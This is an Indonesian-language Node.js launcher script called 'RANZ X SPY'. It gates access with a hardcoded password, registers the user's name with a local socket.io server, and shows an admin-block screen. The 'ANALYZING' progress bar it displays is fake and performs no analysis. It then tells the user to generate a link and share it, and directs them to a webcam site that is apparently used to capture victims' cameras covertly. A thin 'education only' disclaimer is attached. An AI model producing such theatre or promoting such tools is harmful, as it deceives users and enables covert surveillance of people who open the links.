const io = require("socket.io-client");
const readline = require("readline-sync");
const chalk = require("chalk");

console.clear();

// TITLE
console.log(chalk.cyan("╔══════════════════════╗"));
console.log(chalk.cyan("║    RANZ X SPY        ║"));
console.log(chalk.cyan("╚══════════════════════╝\n"));

// PASSWORD
let pass = readline.question("Masukkan sandi: ", { hideEchoBack: true });

if (pass !== "1234") {
    console.log(chalk.red("❌ Sandi salah"));
    process.exit();
}

// INPUT NAMA
let name = readline.question("Masukkan nama kamu: ");

console.log("\n⏳ Menghubungkan ke server...\n");

// GANTI JIKA BEDA DEVICE
const socket = io("http://localhost:3000", {
    reconnection: true,
    reconnectionAttempts: 5,
    timeout: 5000
});

// KONEKSI BERHASIL
socket.on("connect", () => {
    console.log(chalk.green("✔ Terhubung ke server"));
    socket.emit("register", name);

    startScan();
});

// ERROR HANDLING
socket.on("connect_error", () => {
    console.log(chalk.red("❌ Gagal connect ke server! Pastikan server hidup."));
    process.exit();
});

// SCAN
function startScan() {
    let progress = 0;

    const interval = setInterval(() => {
        process.stdout.write("\x1Bc");

        console.log("╔══════════════════════╗");
        console.log(`║ ANALYZING... ${progress}%      ║`);
        console.log("╚══════════════════════╝");

        progress++;

        if (progress > 100) {
            clearInterval(interval);

            console.log("\n✔ Analisis selesai!\n");

            console.log("📌 Deskripsi:");
            console.log("Cara menggunakan: generate link lalu bagikan secara bijak untuk tujuan demonstrasi atau edukasi.\n");

            console.log("⚠ PERINGATAN:");
            console.log("Gunakan hanya untuk pembelajaran. Jangan digunakan untuk melanggar privasi atau merugikan orang lain.");
            console.log("Script by Raizz\n");

            console.log("🔗 Akses website:");
            console.log("👉 https://webcam360.org/\n");
        }
    }, 50);
}

// JIKA DIBLOK
socket.on("blocked", () => {
    console.clear();
    console.log(chalk.red("╔══════════════════════╗"));
    console.log(chalk.red("║     AKSES DITOLAK    ║"));
    console.log(chalk.red("╚══════════════════════╝\n"));
    console.log(chalk.red("⛔ Kamu telah diblokir oleh admin!"));
    process.exit();
});
